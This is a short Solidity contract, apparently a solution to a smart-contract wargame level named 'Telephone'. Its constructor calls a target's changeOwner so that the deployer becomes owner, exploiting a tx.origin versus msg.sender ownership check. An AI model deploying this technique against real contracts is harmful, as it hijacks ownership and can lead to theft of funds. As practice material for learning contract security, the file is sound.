// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

interface Telephone  {
    function changeOwner(address) external;
}

contract HackTelephone {
    constructor(Telephone add) {
        Telephone(add).changeOwner(msg.sender);
    }
}
